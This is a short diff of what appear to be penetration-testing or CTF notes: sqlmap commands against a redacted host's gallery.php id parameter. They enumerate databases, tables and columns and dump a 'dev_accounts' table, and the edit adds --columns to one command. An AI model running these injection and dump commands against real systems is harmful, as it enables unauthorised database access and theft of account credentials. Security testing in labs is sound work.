@@ -8,7 +8,7 @@ sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" --batch
 
 sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" --dbs
 
-sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p id --tables -D gallery
+sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p id --tables -D gallery --columns
 
 sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p id -T dev_accounts --dump
 
